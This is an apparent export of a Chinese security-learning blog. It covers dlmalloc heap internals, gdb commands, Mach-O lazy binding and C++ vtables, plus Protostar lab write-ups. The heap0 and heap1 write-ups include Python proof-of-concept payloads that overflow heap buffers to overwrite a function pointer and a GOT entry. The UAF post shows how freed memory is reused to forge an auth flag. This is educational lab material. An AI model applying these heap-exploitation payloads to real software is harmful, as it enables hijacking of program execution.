[{"title":"深入理解Linux堆分配器-DLMalloc","date":"2017-04-24T04:16:00.000Z","path":"2017/04/24/Linux堆分配器-DLMalloc/Linux堆分配器-DLMalloc/","text":"0x00 序当学习漏洞利用到一定阶段的时候，就需要对操作系统层面有一定的了解了。无疑Linux的堆管理一直是不能甚解。因此这篇文章将对Linux的DLMalloc进行详细的介绍，以此对操作系统的堆管理有一个清晰整体的认识。 0x01 目录1.DLMalloc2.内存Chunk3.Bin4.molloc源码分析 0x02 DLMallocDoug Lea’s Malloc (dlmalloc)是一个GNU C库的内存分配器，它能够通过calloc(),malloc(), free()和realloc()等动态分配和释放的函数来管理内存。 明显内存分配器在操作系统中是相当重要的，主要在需要满足下列的特点： 稳定性(stability) 性能(performance) 避免碎片化(avoidance of fragmentation) 低空间开销(low space overhead） 根据上面的内存特点，将有助于后面对chunk以及Bin等的理解。 0x03 内存chunk1.什么是chunk？chunk是堆中一些连续的内存块，可以用作分配，释放，拆分，合并。不存在两个连续的释放chunk，这是在于相邻的chunk会合并。 2.数据结构 123456struct malloc_chunk &#123; INTERNAL_SIZE_T prev_size; //当前chunk前一个chunk的大小，仅在前一个为freed才使用 INTERNAL_SIZE_T size; //当前chunk的大小 struct malloc_chunk * fd; //如果当前为释放chunk，指向双向free list中前一个chunk struct malloc_chunk * bk; //如果当前为释放chunk，指向双向free list中后一个chunk&#125; 根据上面的描述我们可以知道，chunk在分配时和释放时数据结构是不同的，看下面的图例: allocate chunk freed chunk 3.更多细节因为chunk是按照8字节对齐的，所以当前块中的size低三位将用作相关标志，从右到左A M P分别代表：是否在主heap？是否通过mmap()分配？前一个chunk是否在使用？然后可以想到有一个最小chunk的存在，其大小为16字节()。 4.特殊chunktop chunk:指可能内存边界的末端，也被称作wilderness chunk。如果其他bin都不满足malloc的情况下，就会从top chunk里去一部分去满足分配请求，剩余的则作为新的top chunk，并且top chunk不在任何一个bin中。随着被分离和合并top chunk会增大和减小。 last_remainder:和top chunk一样，不在任何一个bin中，但最终可能会合并到一个bin中。可以看英文原文解释：The last_remainder chunk is the result of allocation requests for small chunks that have no exact fit in any of the bins. If the request is larger than the last_remainder chunk but smaller than a block in a bin, then the chunk is split again. The last_remainder chunk is the result of having to split a larger chunk into two, one part of it is handed out from the allocation, and the other because the last_remainder chunk. 0x04 Binchunk一旦被释放后就会被存储在叫做Bin的链表中，Bin有不同大小的链表，方便与下次查找到最适当的chunk。通常来说有small-bin，large-bin，fast-bin。这里我主要介绍fsatbin和normalbin (1)fastbin：是一种单链表bin，不同系统定义了一个最大值，当chunk大小小于等于这个最大值时，就会被释放到fastbin中，正如名字那样，为了更快的free和malloc，这个链表是无序的，是后进先出（LIFO），并且不与其他chunk合并。(2)normalbin:是一种双向链表bin，当chunk大小大于fastbin的大小时就会被放入这个bin，并且有着各种大小的normalbin(减少碎片)，bin内部的chunk按大小组织起来。释放后会于相邻的chunk合并。 0x05 free()源代码分析及相关细节free(void *mem)--&gt;__libc_free(void *mem) 12345678910111213141516171819202122232425262728293031323334353637383940void__libc_free (void *mem)&#123; mstate ar_ptr; mchunkptr p; /* chunk corresponding to mem */ void (*hook) (void *, const void *) = atomic_forced_read (__free_hook); if (__builtin_expect (hook != NULL, 0)) &#123; (*hook)(mem, RETURN_ADDRESS (0)); return; &#125; if (mem == 0) /* free(0) has no effect */ return; p = mem2chunk (mem); if (chunk_is_mmapped (p)) /* release mmapped memory. */ &#123; /* See if the dynamic brk/mmap threshold needs adjusting. Dumped fake mmapped chunks do not affect the threshold. */ if (!mp_.no_dyn_threshold &amp;&amp; chunksize_nomask (p) &gt; mp_.mmap_threshold &amp;&amp; chunksize_nomask (p) &lt;= DEFAULT_MMAP_THRESHOLD_MAX &amp;&amp; !DUMPED_MAIN_ARENA_CHUNK (p)) &#123; mp_.mmap_threshold = chunksize (p); mp_.trim_threshold = 2 * mp_.mmap_threshold; LIBC_PROBE (memory_mallopt_free_dyn_thresholds, 2, mp_.mmap_threshold, mp_.trim_threshold); &#125; munmap_chunk (p); return; &#125; ar_ptr = arena_for_chunk (p); _int_free (ar_ptr, p, 0); //跳转到_int_free&#125; 我们先不关注其他的，只需要知道会调用_int_free就就可以了 __libc_free(void *mem)--&gt;_int_free (mstate av, mchunkptr p, int have_lock) 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267static void_int_free (mstate av, mchunkptr p, int have_lock)&#123; INTERNAL_SIZE_T size; /* 当前chunk的大小 */ mfastbinptr *fb; /* 相关的fastbin */ mchunkptr nextchunk; /* 下一个相邻的chunk */ INTERNAL_SIZE_T nextsize; /* 下一个chunk的大小 */ int nextinuse; /* 下一个chunk正在使用时为真 */ INTERNAL_SIZE_T prevsize; /* 前一个chunk的大小 */ mchunkptr bck; /* 指向free链表中向后一个chunk */ mchunkptr fwd; /* 指向free链表中向前一个chunk */ const char *errstr = NULL; int locked = 0; size = chunksize (p); /* Little security check which won't hurt performance: the allocator never wrapps around at the end of the address space. Therefore we can exclude some size values which might appear here by accident or by \"design\" from some intruder. */ //一些安全检查 if (__builtin_expect ((uintptr_t) p &gt; (uintptr_t) -size, 0) || __builtin_expect (misaligned_chunk (p), 0)) &#123; errstr = \"free(): invalid pointer\"; errout: if (!have_lock &amp;&amp; locked) __libc_lock_unlock (av-&gt;mutex); malloc_printerr (check_action, errstr, chunk2mem (p), av); return; &#125; /* We know that each chunk is at least MINSIZE bytes in size or a multiple of MALLOC_ALIGNMENT. */ //检查是否满足大于等于最小大小 if (__glibc_unlikely (size &lt; MINSIZE || !aligned_OK (size))) &#123; errstr = \"free(): invalid size\"; goto errout; &#125; check_inuse_chunk(av, p); //检查当前chunk是否在使用 /* 如果满足，则将该chunk放入fastbin以便malloc时能够快速找到和使用 */ if ((unsigned long)(size) &lt;= (unsigned long)(get_max_fast ())#if TRIM_FASTBINS /* If TRIM_FASTBINS set, don't place chunks bordering top into fastbins */ &amp;&amp; (chunk_at_offset(p, size) != av-&gt;top)#endif ) &#123; if (__builtin_expect (chunksize_nomask (chunk_at_offset (p, size)) &lt;= 2 * SIZE_SZ, 0) || __builtin_expect (chunksize (chunk_at_offset (p, size)) &gt;= av-&gt;system_mem, 0)) &#123; /* We might not have a lock at this point and concurrent modifications of system_mem might have let to a false positive. Redo the test after getting the lock. */ if (have_lock || (&#123; assert (locked == 0); __libc_lock_lock (av-&gt;mutex); locked = 1; chunksize_nomask (chunk_at_offset (p, size)) &lt;= 2 * SIZE_SZ || chunksize (chunk_at_offset (p, size)) &gt;= av-&gt;system_mem; &#125;)) &#123; errstr = \"free(): invalid next size (fast)\"; goto errout; &#125; if (! have_lock) &#123; __libc_lock_unlock (av-&gt;mutex); locked = 0; &#125; &#125; free_perturb (chunk2mem(p), size - 2 * SIZE_SZ); set_fastchunks(av); unsigned int idx = fastbin_index(size); fb = &amp;fastbin (av, idx); /* Atomically link P to its fastbin: P-&gt;FD = *FB; *FB = P; */ mchunkptr old = *fb, old2; unsigned int old_idx = ~0u; do &#123; /* Check that the top of the bin is not the record we are going to add (i.e., double free). */ if (__builtin_expect (old == p, 0)) &#123; errstr = \"double free or corruption (fasttop)\"; goto errout; &#125; /* Check that size of fastbin chunk at the top is the same as size of the chunk that we are adding. We can dereference OLD only if we have the lock, otherwise it might have already been deallocated. See use of OLD_IDX below for the actual check. */ if (have_lock &amp;&amp; old != NULL) old_idx = fastbin_index(chunksize(old)); p-&gt;fd = old2 = old; &#125; while ((old = catomic_compare_and_exchange_val_rel (fb, p, old2)) != old2); if (have_lock &amp;&amp; old != NULL &amp;&amp; __builtin_expect (old_idx != idx, 0)) &#123; errstr = \"invalid fastbin entry (free)\"; goto errout; &#125; &#125; /* Consolidate other non-mmapped chunks as they arrive. */ //检查是否是通过mmap()分配的内存 else if (!chunk_is_mmapped(p)) &#123; if (! have_lock) &#123; __libc_lock_lock (av-&gt;mutex); locked = 1; &#125; nextchunk = chunk_at_offset(p, size);//返回下一个chunk的地址 /* Lightweight tests: check whether the block is already the top block. */ //检查下一个是否为top-chunk if (__glibc_unlikely (p == av-&gt;top)) &#123; errstr = \"double free or corruption (top)\"; goto errout; &#125; /* Or whether the next chunk is beyond the boundaries of the arena. */ if (__builtin_expect (contiguous (av) &amp;&amp; (char *) nextchunk &gt;= ((char *) av-&gt;top + chunksize(av-&gt;top)), 0)) &#123; errstr = \"double free or corruption (out)\"; goto errout; &#125; /* Or whether the block is actually not marked used. */ if (__glibc_unlikely (!prev_inuse(nextchunk))) &#123; errstr = \"double free or corruption (!prev)\"; goto errout; &#125; nextsize = chunksize(nextchunk); if (__builtin_expect (chunksize_nomask (nextchunk) &lt;= 2 * SIZE_SZ, 0) || __builtin_expect (nextsize &gt;= av-&gt;system_mem, 0)) &#123; errstr = \"free(): invalid next size (normal)\"; goto errout; &#125; free_perturb (chunk2mem(p), size - 2 * SIZE_SZ); /* 与后面chunk一个合并 */ if (!prev_inuse(p)) &#123; prevsize = prev_size (p); size += prevsize; p = chunk_at_offset(p, -((long) prevsize)); unlink(av, p, bck, fwd);//将后一个chunk从双向链表上取下来 &#125; if (nextchunk != av-&gt;top) &#123; /* get and clear inuse bit */ nextinuse = inuse_bit_at_offset(nextchunk, nextsize); /* 与前面chunk一个合并*/ if (!nextinuse) &#123; unlink(av, nextchunk, bck, fwd);//将前一个chunk从双向链表上取下来 size += nextsize; &#125; else clear_inuse_bit_at_offset(nextchunk, 0); /* Place the chunk in unsorted chunk list. Chunks are not placed into regular bins until after they have been given one chance to be used in malloc. */ bck = unsorted_chunks(av); fwd = bck-&gt;fd; if (__glibc_unlikely (fwd-&gt;bk != bck)) &#123; errstr = \"free(): corrupted unsorted chunks\"; goto errout; &#125; p-&gt;fd = fwd; p-&gt;bk = bck; if (!in_smallbin_range(size)) &#123; p-&gt;fd_nextsize = NULL; p-&gt;bk_nextsize = NULL; &#125; bck-&gt;fd = p; fwd-&gt;bk = p; set_head(p, size | PREV_INUSE); set_foot(p, size); check_free_chunk(av, p); &#125; /* 如果当前chunk正好与topchunk相邻，则合并到topchunk */ else &#123; size += nextsize; set_head(p, size | PREV_INUSE); av-&gt;top = p; check_chunk(av, p); &#125; /* If freeing a large space, consolidate possibly-surrounding chunks. Then, if the total unused topmost memory exceeds trim threshold, ask malloc_trim to reduce top. Unless max_fast is 0, we don't know if there are fastbins bordering top, so we cannot tell for sure whether threshold has been reached unless fastbins are consolidated. But we don't want to consolidate on each free. As a compromise, consolidation is performed if FASTBIN_CONSOLIDATION_THRESHOLD is reached. */ if ((unsigned long)(size) &gt;= FASTBIN_CONSOLIDATION_THRESHOLD) &#123; if (have_fastchunks(av)) malloc_consolidate(av); if (av == &amp;main_arena) &#123;#ifndef MORECORE_CANNOT_TRIM if ((unsigned long)(chunksize(av-&gt;top)) &gt;= (unsigned long)(mp_.trim_threshold)) systrim(mp_.top_pad, av);#endif &#125; else &#123; /* Always try heap_trim(), even if the top chunk is not large, because the corresponding heap might go away. */ heap_info *heap = heap_for_ptr(top(av)); assert(heap-&gt;ar_ptr == av); heap_trim(heap, mp_.top_pad); &#125; &#125; if (! have_lock) &#123; assert (locked); __libc_lock_unlock (av-&gt;mutex); &#125; &#125; /* If the chunk was allocated via mmap, release via munmap(). */ else &#123; munmap_chunk (p); &#125;&#125; 这里重点看看unlink()宏定义 123456#define unlink( P, BK, FD ) &#123; BK = P-&gt;bk; FD = P-&gt;fd; FD-&gt;bk = BK; //可能会造成任意写 BK-&gt;fd = FD; &#125; glibc/malloc.c源码 0x06 参考 Vudo malloc tricks A Memory Allocator Once upon a free()","tags":[{"name":"linux","slug":"linux","permalink":"https://github.com/NULL-ME/NULL-ME.github.io.git/tags/linux/"},{"name":"heap","slug":"heap","permalink":"https://github.com/NULL-ME/NULL-ME.github.io.git/tags/heap/"},{"name":"malloc","slug":"malloc","permalink":"https://github.com/NULL-ME/NULL-ME.github.io.git/tags/malloc/"},{"name":"free","slug":"free","permalink":"https://github.com/NULL-ME/NULL-ME.github.io.git/tags/free/"}]},{"title":"Protostar-堆溢出系列学习-heap UAF","date":"2017-04-13T03:12:19.000Z","path":"2017/04/13/Protostar-堆溢出系列学习-heap 2/Protostar-堆溢出系列学习-heap 2/","text":"0x00 序下面看一个堆中常见的漏洞-UAF(use after free) 0x01 C语言源代码123456789101112131415161718192021222324252627282930313233343536373839404142434445#include &lt;stdlib.h&gt;#include &lt;unistd.h&gt;#include &lt;string.h&gt;#include &lt;sys/types.h&gt;#include &lt;stdio.h&gt;struct auth &#123; char name[32]; int auth;&#125;;struct auth *auth;char *service;int main(int argc, char **argv)&#123; char line[128]; while(1) &#123; printf(\"[ auth = %p, service = %p ]\\n\", auth, service); if(fgets(line, sizeof(line), stdin) == NULL) break; if(strncmp(line, \"auth \", 5) == 0) &#123; auth = malloc(sizeof(auth)); memset(auth, 0, sizeof(auth)); if(strlen(line + 5) &lt; 31) &#123; strcpy(auth-&gt;name, line + 5); &#125; &#125; if(strncmp(line, \"reset\", 5) == 0) &#123; free(auth); &#125; if(strncmp(line, \"service\", 6) == 0) &#123; service = strdup(line + 7); &#125; if(strncmp(line, \"login\", 5) == 0) &#123; if(auth-&gt;auth) &#123; printf(\"you have logged in already!\\n\"); &#125; else &#123; printf(\"please enter your password\\n\"); &#125; &#125; &#125;&#125; 0x02 分析&amp;思考程序有4个命令，对auth这个结构体进行分配内存以及释放内存，然后有结构体里的auth-&gt;auth来决定是否授权。很明显让我们修改auth-&gt;auth的值。reset命令释放auth但没有设为null，后面auth-&gt;auth发生引用。所以这里有个UAF漏洞。 0x03 调试&amp;hack1.在第一个printf处下个断点，观察每次分配和释放后堆，auth以及service的情况 2.先输入auth admin，然后输入login试试3.再输入reset释放堆内存4.输入service分配内存5.以上我们可以发现，给service分配的内存居然也指向auth的地址？因为之前free了auth，所以系统认为这段内存为可用，当再次分配的时候就会返回对应内存。基于此，我们继续给service分配内存，让其覆盖auth-&gt;auth的内存值。6.再次输入login命令 0x04 一点感受通过这个例子简单的学习了UAF漏洞后，无疑free后不设为null，后果是不敢想象的。继续学习堆相关的漏洞利用。keep hack！","tags":[{"name":"Linux","slug":"Linux","permalink":"https://github.com/NULL-ME/NULL-ME.github.io.git/tags/Linux/"},{"name":"Protostar","slug":"Protostar","permalink":"https://github.com/NULL-ME/NULL-ME.github.io.git/tags/Protostar/"},{"name":"UAF","slug":"UAF","permalink":"https://github.com/NULL-ME/NULL-ME.github.io.git/tags/UAF/"}]},{"title":"Protostar-堆溢出系列学习-heap 0","date":"2017-04-10T03:12:19.000Z","path":"2017/04/10/Protostar-堆溢出系列学习-heap 0/Protostar-堆溢出系列学习-heap 0/","text":"0x00 序学习了栈溢出相关的漏洞利用技巧，下面进入堆溢出相关。和栈溢出一样，从最简单的堆溢出开始，看看是如何利用堆溢出去控制程序的执行流程的。 0x01 heap0C代码 12345678910111213141516171819202122232425262728293031323334353637383940#include &lt;stdlib.h&gt;#include &lt;unistd.h&gt;#include &lt;string.h&gt;#include &lt;stdio.h&gt;#include &lt;sys/types.h&gt;struct data &#123; char name[64];&#125;;struct fp &#123; int (*fp)();&#125;;void winner()&#123; printf(\"level passed\\n\");&#125;void nowinner()&#123; printf(\"level has not been passed\\n\");&#125;int main(int argc, char **argv)&#123; struct data *d; struct fp *f; d = malloc(sizeof(struct data)); f = malloc(sizeof(struct fp)); f-&gt;fp = nowinner; printf(\"data is at %p, fp is at %p\\n\", d, f); strcpy(d-&gt;name, argv[1]); f-&gt;fp();&#125; 0x02 简单分析&amp;思考先在堆上分配了一个data和fp的结构体，然后使fp指向nowinner函数，然后打印对应分配的堆地址，以及将argv[1]复制到data结构体，最后调用nowinner函数。 可以知道我们需要去执行winner函数，怎么做到呢？ 由于strcpy没对数据长度进行检查，那我们是否可以利用堆溢出将fp结构体里面的函数指针改为winner函数？Here we go！ 0x03 malloc()在继续分析之前，我们先来简单的介绍一下malloc函数，在这里malloc函数更多是对mmap系统调用函数的一个封装，为什么要封装呢？也就是为什么不直接调用mmap来进行堆分配，原因是为了方便堆的管理，简单的理解可以把堆看做一个很大的内存块。 那是如何管理堆的呢？见下 堆标志 分配大小 malloc返回地址addr 00000000 00000011 00000000 00000000 00000000 00000031 AAAAAAAA BBBBBBBB CCCCCCCC DDDDDDDD EEEEEEEE FFFFFFFF … … … … 00000000 00000011 00000000 00000000 每次分配的时候会额外分配16字节的管理开销，来表示所分配堆的信息。比如可以通过addr-4拿到自身的分配大小从而决定下次分配的选择 注：分配大小的第一位表示前面的内存块是否在使用 0x04 调试&amp;hack通过前面的分析，我们的目的很明确，需要通过strcpy(d-&gt;name, argv[1]);去重写fp结构体里面的函数指针，使其为winner函数的地址。 1.利用gdb查看strcpy前后堆的情况我们看到AAAABBBBCCC…分配到了data堆上，如果我们输入更长的数据，就可以将fp的nowinner地址改为winner地址 2.查看winner地址，重写fp函数指针 12(gdb) p winner $1 = &#123;void (void)&#125; 0x8048464 &lt;winner&gt; 3.PoC Python脚本 123456import structpadding = \"A\"*64 #填充datahead = \"BBBB\" # not carehead += \"CCCC\" # not carewinner = struct.pack(\"I\", 0x8048464) #将nowinner地址改为winner地址print padding+head+winner 4.hack成功执行winner函数!","tags":[{"name":"Linux","slug":"Linux","permalink":"https://github.com/NULL-ME/NULL-ME.github.io.git/tags/Linux/"},{"name":"Protostar","slug":"Protostar","permalink":"https://github.com/NULL-ME/NULL-ME.github.io.git/tags/Protostar/"},{"name":"堆溢出","slug":"堆溢出","permalink":"https://github.com/NULL-ME/NULL-ME.github.io.git/tags/堆溢出/"}]},{"title":"Protostar-堆溢出系列学习-heap 1","date":"2017-04-10T03:12:19.000Z","path":"2017/04/10/Protostar-堆溢出系列学习-heap 1/Protostar-堆溢出系列学习-heap 1/","text":"0x00 序现在我们来学习一下利用堆溢出修改GOT表达到代码劫持的列子。 0x01 heap1C代码 123456789101112131415161718192021222324252627282930313233#include &lt;stdlib.h&gt;#include &lt;unistd.h&gt;#include &lt;string.h&gt;#include &lt;stdio.h&gt;#include &lt;sys/types.h&gt;struct internet &#123; int priority; char *name;&#125;;void winner()&#123; printf(\"and we have a winner @ %d\\n\", time(NULL));&#125;int main(int argc, char **argv)&#123; struct internet *i1, *i2, *i3; i1 = malloc(sizeof(struct internet)); i1-&gt;priority = 1; i1-&gt;name = malloc(8); i2 = malloc(sizeof(struct internet)); i2-&gt;priority = 2; i2-&gt;name = malloc(8); strcpy(i1-&gt;name, argv[1]); strcpy(i2-&gt;name, argv[2]); printf(\"and that's a wrap folks!\\n\");&#125; 0x02 简单的分析&amp;思考如果之前没有相关的漏洞利用经验的话，一时还是想不到怎么去利用这个堆溢出漏洞。但这里有两个strcpy，肯定是要去覆盖和修改某个地方的地址。其实strcpy这个函数是非常危险的，既能溢出，又能对任意地址进行写操作。在这个列子中，我们就借此去修改printf函数的GOT表。 0x03 调试1.查看堆分配情况2.查看汇编代码，找到执行入口3.首先利用第一个strcpy将i2的name指针改为GOT表地址，然后利用第二个strcpy向这个地址写入winner的地址，由此编写对应的Python PoC 123456import structpadding = \"AAAA\"*5put_got = struct.pack(\"I\", 0x8049774) #put的GOT表地址space = \" \"winner = struct.pack(\"I\", 0x8048494) #winner函数地址print padding+put_got+space+winner 4.hack 12user@protostar:/tmp$ /opt/protostar/bin/heap1 `python heap1.py`and we have a winner @ 1492452139 成功执行winner函数 0x04 一点感受学到现在，感受很多，对用户输入的数据完全信任是多么的可怕。可能有一万种的方法去利用这个漏洞达到代码执行。比如这里，将strcpy改为strncpy或者在copy前先检查下长度的话就能避免。所以写好一个有质量的代码是多么重要。","tags":[{"name":"Linux","slug":"Linux","permalink":"https://github.com/NULL-ME/NULL-ME.github.io.git/tags/Linux/"},{"name":"Protostar","slug":"Protostar","permalink":"https://github.com/NULL-ME/NULL-ME.github.io.git/tags/Protostar/"},{"name":"栈溢出","slug":"栈溢出","permalink":"https://github.com/NULL-ME/NULL-ME.github.io.git/tags/栈溢出/"}]},{"title":"Mach-o动态链接","date":"2017-04-10T03:12:19.000Z","path":"2017/04/10/mach-o动态链接/mach-o动态链接/","text":"0x00 序可执行文件很少是独立的，除了极少数的一些静态链接的可执行文件以外，大多的都是动态链接，这就需要依赖一些预先存在的库，这些库可以是操作系统提供的动态共享库，也可以是第三方的库。所以在可执行文件中充满了大量对外部库的符号的引用，这些空洞就需要动态链接器来完成所谓的符号绑定。macOS中是内核执行LC_DYLINKER加载命令时启动的，通常为/usr/lib/dyld接管刚创建进程的控制权。本文就来分析其符号的动态链接过程。 0x01 符号的加载过程以下面这个简单的C语言程序为例。 12345void main(int argc, char *argv[]) &#123; printf(\"first printf\"); printf(\"second printf\");&#125; 对应的汇编代码 1234567891011121314151617-&gt; 0x100000f40 &lt;+0&gt;: pushq %rbp 0x100000f41 &lt;+1&gt;: movq %rsp, %rbp 0x100000f44 &lt;+4&gt;: subq $0x20, %rsp 0x100000f48 &lt;+8&gt;: leaq 0x4b(%rip), %rax ; \"first printf\" 0x100000f4f &lt;+15&gt;: movl %edi, -0x4(%rbp) 0x100000f52 &lt;+18&gt;: movq %rsi, -0x10(%rbp) 0x100000f56 &lt;+22&gt;: movq %rax, %rdi 0x100000f59 &lt;+25&gt;: movb $0x0, %al 0x100000f5b &lt;+27&gt;: callq 0x100000f7a ; symbol stub for: printf 0x100000f60 &lt;+32&gt;: leaq 0x40(%rip), %rdi ; \"second printf\" 0x100000f67 &lt;+39&gt;: movl %eax, -0x14(%rbp) 0x100000f6a &lt;+42&gt;: movb $0x0, %al 0x100000f6c &lt;+44&gt;: callq 0x100000f7a ; symbol stub for: printf 0x100000f71 &lt;+49&gt;: movl %eax, -0x18(%rbp) 0x100000f74 &lt;+52&gt;: addq $0x20, %rsp 0x100000f78 &lt;+56&gt;: popq %rbp 0x100000f79 &lt;+57&gt;: retq 和大多数的Linux系统一样，mach-o符号的动态绑定也采用了打桩机制，简单的说就是在遇到外部符号的时候就会先跳转到stub区 第一次printf会先进入dyld_stub_binder区去找到printf函数的地址，我们用lldb调试观察DATA段la_symbol_ptr区地址值 会发现正好地址在dyld_stub_binder区 验证: 第二次printf我们在观察DATA段la_symbol_ptr区地址值 我们会发现当第二次再次调用printf函数时，还是会先跳转到stub区，但此时la_symbol_ptr中的值却变为了printf的真实地址，而不是dyld_stub_binder。这样就完成了一次延时绑定，后面就直接调用。 0x02 stub桩机制总结综上分析，我们可以发现所有的外部函数引用都会在DATA段la_symbol_ptr区中产生一个占位符，其初始值为dyld_stub_binder区中对应的编号地址。当第一个调用时，就会进入符号的动态链接过程，一旦找到其地址后，就会将DATA段la_symbol_ptr区中的占位符改为找到后的地址。这样就完成了只需要一个符号绑定。 stub桩机制的巧妙之处也在此，首先当产生一个外部符号调用时，直接跳到对应的stub桩位置，然后由里面保存的地址来判断是第一次调用还是已经找到符号的地址。就像桩这个名字含义一样，一个占位符的思想。 0x03 参考Mach-O的动态链接相关知识 Dynamic Linking: ELF vs. Mach-O Dynamic symbol table duel: ELF vs Mach-O, round 2","tags":[{"name":"mach-o","slug":"mach-o","permalink":"https://github.com/NULL-ME/NULL-ME.github.io.git/tags/mach-o/"},{"name":"dyld","slug":"dyld","permalink":"https://github.com/NULL-ME/NULL-ME.github.io.git/tags/dyld/"},{"name":"stub","slug":"stub","permalink":"https://github.com/NULL-ME/NULL-ME.github.io.git/tags/stub/"}]},{"title":"gdb常用调试命令总结","date":"2017-03-21T03:06:59.000Z","path":"2017/03/21/gdb常用调试命令总结/gdb/","text":"0x01 序最近在做TCTF上一道Linux下的逆向题，对GDB的调试很多命令相关做一个小总结，可能不是很系统，只是记一些比较常用的，后面可能会不定期更新。 0x02 命令行参数有时候，我们需要调试的程序需要有命令行参数，很多朋友都不知道怎么设置调试的程序的命令行参数。其实，有两种方法： gdb命令行的 –args 参数 gdb环境中 set args命令 show args查看程序参数 0x03 多线程调试多线程调试可能是问得最多的。其实，重要就是下面几个命令： info thread 查看当前进程的线程。thread 切换调试的线程为指定ID的线程。break file.c:100 thread all 在file.c文件第100行处为所有经过这里的线程设置断点。set scheduler-locking off|on|step，这个是问得最多的。在使用step或者continue命令调试当前被调试线程的时候，其他线程也是同时执行的，怎么只让被调试程序执行呢？通过这个命令就可以实现这个需求。 off 不锁定任何线程，也就是所有线程都执行，这是默认值。 on 只有当前被调试程序会执行。 step 在单步的时候，除了next过一个函数的情况(熟悉情况的人可能知道，这其实是一个设置断点然后continue的行为)以外，只有当前线程会执行。 0x04 断点 break *0x000000 下断点 info breakpoints 查看断点 delete break 1 删除断点 break [where] if [condition] 条件断点 enable 恢复失效的断点 disable 使断点失效 clear 清除断点 break 21 在第21行设置断点 break main 在main函数处设置断点 break test 在函数test处设置断点 0x05 x命令也许，你很喜欢用p命令。所以，当你不知道变量名的时候，你可能会手足无措，因为p命令总是需要一个变量名的。x命令是用来查看内存的，在gdb中 “help x” 你可以查看其帮助。 x/x 以十六进制输出 x/d 以十进制输出 x/c 以单字符输出 x/i 反汇编 – 通常，我们会使用 x/10i $ip-20 来查看当前的汇编（$ip是指令寄存器） x/s 以字符串输出 x/5i $pc 查看汇编代码 x/4wx 0x000000 查看内存 0x06 command命令有一些朋友问我如何自动化调试。这里向大家介绍command命令，简单的理解一下，其就是把一组gdb的命令打包，有点像字处理软件的“宏”。下面是一个示例：12345678910(gdb) break funcBreakpoint 1 at 0x3475678: file test.c, line 12.(gdb) command 1Type commands for when breakpoint 1 is hit, one per line.End with a line saying just \"end\".&gt;print arg1&gt;print arg2&gt;print arg3&gt;end(gdb) 当我们的断点到达时，自动执行command中的三个命令，把func的三个参数值打出来。 0x07 其他 step / s 下一步，直接执行下一条程序 set disassembly-flavor intel 设置为intel汇编指令 info proc mappings `define stop-hook 设置断点触发后自动执行命令 info registersx/24wx $espx/2i $eipend` continue / cont 下一段，如果遇到函数，不会进入函数，逐过程，有点类似VS里面的F10 run 运行 finish 结束调试 print / p 显示某个变量的值 p *array@len 输出数组 p i 输出i的值 0x08 附表寄存器宽度表12345|63..32|31..16|15-8|7-0| |AH.|AL.| |AX.....| |EAX............||RAX...................|","tags":[{"name":"linux","slug":"linux","permalink":"https://github.com/NULL-ME/NULL-ME.github.io.git/tags/linux/"},{"name":"gdb","slug":"gdb","permalink":"https://github.com/NULL-ME/NULL-ME.github.io.git/tags/gdb/"},{"name":"调试","slug":"调试","permalink":"https://github.com/NULL-ME/NULL-ME.github.io.git/tags/调试/"}]},{"title":"详解virtual table","date":"2017-03-06T17:51:44.000Z","path":"2017/03/07/C++ Virtual table/详解virtual table/","text":"详解virtual tableC++中的虚函数的作用主要是实现了多态的机制。关于多态，简而言之就是用父类型别的指针指向其子类的实例，然后通过父类的指针调用实际子类的成员函数。这种技术可以让父类的指针有“多种形态”，这是一种泛型技术。所谓泛型技术，说白了就是试图使用不变的代码来实现可变的算法。比如：模板技术，RTTI技术，虚函数技术，要么是试图做到在编译时决议，要么试图做到运行时决议。 关于虚函数的使用方法，我在这里不做过多的阐述。大家可以看看相关的C++的书籍。在这篇文章中，我只想从虚函数的实现机制上面为大家 一个清晰的剖析。 当然，相同的文章在网上也出现过一些了，但我总感觉这些文章不是很容易阅读，大段大段的代码，没有图片，没有详细的说明，没有比较，没有举一反三。不利于学习和阅读，所以这是我想写下这篇文章的原因。也希望大家多给我提意见。 言归正传，让我们一起进入虚函数的世界。 虚函数表 对C++ 了解的人都应该知道虚函数（Virtual Function）是通过一张虚函数表（Virtual Table）来实现的。简称为V-Table。 在这个表中，主是要一个类的虚函数的地址表，这张表解决了继承、覆盖的问题，保证其容真实反应实际的函数。这样，在有虚函数的类的实例中这个表被分配在了 这个实例的内存中，所以，当我们用父类的指针来操作一个子类的时候，这张虚函数表就显得由为重要了，它就像一个地图一样，指明了实际所应该调用的函数。 这里我们着重看一下这张虚函数表。在C++的标准规格说明书中说到，编译器必需要保证虚函数表的指针存在于对象实例中最前面的位置（这是为了保证正确取到虚函数的偏移量）。 这意味着我们通过对象实例的地址得到这张虚函数表，然后就可以遍历其中函数指针，并调用相应的函数。 听我扯了那么多，我可以感觉出来你现在可能比以前更加晕头转向了。 没关系，下面就是实际的例子，相信聪明的你一看就明白了。 假设我们有这样的一个类： 1234567891011class Base &#123;public:virtual void f() &#123; cout &lt;&lt; \"Base::f\" &lt;&lt; endl; &#125;virtual void g() &#123; cout &lt;&lt; \"Base::g\" &lt;&lt; endl; &#125;virtual void h() &#123; cout &lt;&lt; \"Base::h\" &lt;&lt; endl; &#125;&#125;; 按照上面的说法，我们可以通过Base的实例来得到虚函数表。 下面是实际例程： 123456789101112131415typedef void(*Fun)(void);Base b;Fun pFun = NULL;cout &lt;&lt; \"虚函数表地址：\" &lt;&lt; (int*)(&amp;b) &lt;&lt; endl;cout &lt;&lt; \"虚函数表 — 第一个函数地址：\" &lt;&lt; (int*)*(int*)(&amp;b) &lt;&lt; endl;// Invoke the first virtual functionpFun = (Fun)*((int*)*(int*)(&amp;b));pFun(); 实际运行经果如下：(Windows XP+VS2003, Linux 2.6.22 + GCC 4.1.3) 虚函数表地址：0012FED4 虚函数表 — 第一个函数地址：0044F148 Base::f 通过这个示例，我们可以看到，我们可以通过强行把&amp;b转成int *，取得虚函数表的地址，然后，再次取址就可以得到第一个虚函数的地址了，也就是Base::f()，这在上面的程序中得到了验证（把int* 强制转成了函数指针）。通过这个示例，我们就可以知道如果要调用Base::g()和Base::h()，其代码如下： 